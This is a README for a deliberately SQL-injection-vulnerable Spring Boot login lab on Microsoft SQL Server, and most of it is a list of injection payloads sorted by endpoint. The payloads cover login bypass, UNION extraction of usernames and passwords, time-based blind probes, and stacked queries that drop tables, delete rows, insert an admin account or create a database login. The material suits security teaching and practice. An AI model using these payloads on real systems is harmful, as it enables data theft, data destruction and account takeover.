                    ----------- DECRIPTION --------------
Topic : Stimulate SQL INJECTION VULNERABLE Website - Login Page 
Information : Tool Postman to call API through POST method from login form 
Run :
- mvn test 
- mvn clean 
- mvn clean package 
- mvn --version 
- mvn spring-boot:run 
Database : MSSQL - MICROSOFT SQL SERVER 
Run maven spring boot : 
- Java JDK 17 and more 
- Apache maven : 3.9.9
- Java version : 21.0.6 
Port : 8080 
Model - view - Controller 
Payload : 
- "' OR '1'='1' -- "
- "user1' OR '1'='1"
/classic : 
- '; DROP TABLE UserLogin1; -- 
- ' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'UserLogin1' -- 
- '; WAITFOR DELAY '00:00:05' -- 
- ' UNION SELECT table_name FROM information_schema.tables WHERE table_catalog = DB_NAME() --  
- ' OR '1'='1' -- 
- ' UNION SELECT Username FROM UserLogin1; WAITFOR DELAY '00:00:10' -- 
- ' OR EXISTS(SELECT 1 FROM UserLogin1); WAITFOR DELAY '00:00:05' --  
- ' UNION SELECT @@VERSION -- 
- ' UNION SELECT schema_name FROM information_schema.schemata -- 
- ' DELETE FROM UserLogin1 WHERE 1=1 -- 
- '; DELETE FROM UserLogin1 WHERE 1=1; WAITFOR DELAY '00:00:05' --  
/union : 
- ' OR '1'='1' -- 
- ' UNION SELECT @@VERSION --
- ' UNION SELECT table_name FROM information_schema.tables -- 
- ' UNION SELECT Username FROM UserLogin1 -- 
- ' UNION SELECT @@VERSION AS Username FROM UserLogin1 --
- ' UNION SELECT NULL; WAITFOR DELAY '00:00:05'; DELETE FROM UserLogin1 --
- ' UNION ALL SELECT Username FROM UserLogin1 --
- ' ; EXEC sp_executesql N'CREATE LOGIN test_user WITH PASSWORD = ''StrongPass123!'''; --
/union1 : 
- '; INSERT INTO UserLogin1 (Username, Password, Email, Role) VALUES ('attacker', HASHBYTES('SHA2_256', 'P@ssword123'), 'attacker@mail.com', 'admin'); --
- ' ORDER BY 1 -- 
- '; DELETE FROM UserLogin1 -- 
/blind-time : 
- 1=1 AND 1=1
- 1=1 AND 1=2 
- 1=1
- 1=2 
- 1=1 OR 1=1 
- 1=1 OR 1=2 

<!-- /time : 
- ' WAITFOR DELAY '0:0:5' --
- ' OR username = 'admin' -- 
- ' OR substring(Username, 1, 1) = 'a' -- 
- ' OR 1=1 WAITFOR DELAY '00:00:05' --  -->
/error 
- ' UNION SELECT NULL --
- ' UNION SELECT 1/0 --
- ' ORDER BY 1 --
- ' UNION SELECT @@VERSION --
- ' UNION SELECT CAST('abc' AS INT) -
- ' UNION SELECT CONVERT(INT, 'abc') --
- ' UNION SELECT CAST(@@version AS INT) --
/stacked 
- admin'; INSERT INTO Logs (Message) VALUES ('SQL Injection Success!'); --
- '; INSERT INTO Logs (Message) VALUES ('Hacked') --
- '; UPDATE UserLogin1 SET Role='admin' WHERE Username='user1' --
- '; DELETE FROM UserLogin1 --
- '; INSERT INTO UserLogin1 (Username, Password) VALUES ('admin2', 'password123') --
/update-bio : 
- {
    "username": "admin",
    "bio": "'; DROP TABLE UserLogin2 --"
}
- {
    "username": "admin",
    "bio": "' + (SELECT password FROM UserLogin2 WHERE username = 'admin') + '"
}
- {
    "username": "admin",
    "bio": "'; INSERT INTO UserLogin2 (Username, Password, Bio) VALUES ('attacker', 'P@ssw0rd', 'Admin access'); --"
}
- {
    "username": "admin",
    "bio": "'; DELETE FROM UserLogin2 WHERE Username != 'admin'; --"
}
- {
    "username": "admin",
    "bio": "'; UPDATE UserLogin2 SET Password = 'new_hacked_password' WHERE Username = 'admin'; --"
}
- {
    "username": "hacker",
    "bio": "'; UPDATE UserLogin2 SET Bio = 'System administrator' WHERE Username = 'hacker'; --"
}
/view-bio 
- {
    "username": "' UNION SELECT username + ':' + password FROM UserLogin2 -- "
}
- {
    "username": "' UNION SELECT DB_NAME() -- "
}
- {
    "username": "' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES -- "
}
- {
    "username": "' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='UserLogin2' -- "
}
- {
    "username": "' UNION SELECT password FROM UserLogin2 WHERE username='admin' -- "
}
